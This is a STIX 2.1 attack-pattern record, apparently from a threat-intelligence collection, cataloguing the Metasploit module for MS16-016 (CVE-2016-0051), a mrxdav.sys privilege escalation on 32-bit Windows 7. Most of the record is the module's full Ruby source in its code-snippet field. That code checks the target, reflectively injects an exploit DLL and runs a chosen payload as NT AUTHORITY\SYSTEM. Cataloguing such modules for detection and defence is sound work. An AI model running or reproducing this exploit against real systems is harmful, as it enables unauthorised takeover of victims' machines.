{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a132281b-4ce0-4dbb-b621-fdf2eaed0709",
    "created": "2024-08-14T16:49:47.35688Z",
    "modified": "2024-08-14T16:49:47.356884Z",
    "name": "MS16-016 mrxdav.sys WebDav Local Privilege Escalation",
    "description": " This module exploits the vulnerability in mrxdav.sys described by MS16-016.  The module will spawn a process on the target system and elevate its privileges to NT AUTHORITY\\SYSTEM before executing the specified payload within the context of the elevated process.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/ms16_016_webdav.rb",
            "external_id": "ms16_016_webdav.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-0051"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n  include Msf::Post::Windows::FileInfo\n  include Msf::Post::Windows::ReflectiveDLLInjection\n\n  def initialize(info={})\n    super(update_info(info, {\n      'Name'           => 'MS16-016 mrxdav.sys WebDav Local Privilege Escalation',\n      'Description'    => %q{\n        This module exploits the vulnerability in mrxdav.sys described by MS16-016.  The module will spawn\n        a process on the target system and elevate its privileges to NT AUTHORITY\\SYSTEM before executing\n        the specified payload within the context of the elevated process.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Tamas Koczka',                               # Original Exploit\n          'William Webb <william_webb[at]rapid7.com>'   # C port and Metasploit module\n        ],\n      'Arch'           => ARCH_X86,\n      'Platform'       => 'win',\n      'SessionTypes'   => [ 'meterpreter' ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n          'DisablePayloadHandler' => false\n        },\n      'Targets'        =>\n        [\n          [ 'Windows 7 SP1', { } ]\n        ],\n      'Payload'        =>\n        {\n          'Space'       => 4096,\n          'DisableNops' => true\n        },\n      'References'     =>\n        [\n          [ 'CVE', '2016-0051' ],\n          [ 'MSB', 'MS16-016'  ]\n        ],\n      'DisclosureDate' => '2016-02-09',\n      'DefaultTarget'  => 0\n    }))\n  end\n\n  def check\n    if sysinfo[\"Architecture\"] == ARCH_X64\n      return Exploit::CheckCode::Safe\n    end\n\n    Exploit::CheckCode::Detected\n  end\n\n  def exploit\n    if is_system?\n      fail_with(Failure::None, 'Session is already elevated')\n    end\n\n    if sysinfo[\"Architecture\"] == ARCH_X64\n      fail_with(Failure::NoTarget, \"Running against 64-bit systems is not supported\")\n    end\n\n    print_status('Launching a process to host the payload DLL, then reflectively injecting the DLL and running it...')\n    encoded_payload = payload.encoded\n    execute_dll(\n      ::File.join(Msf::Config.data_directory, \"exploits\", \"cve-2016-0051\", \"cve-2016-0051.x86.dll\"),\n      encoded_payload\n    )\n    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')\n    sleep(3)\n  end\n end\n\n",
    "x_mitre_disclosure_date": "2016-02-09",
    "x_mitre_platforms": [
        "win'"
    ]
}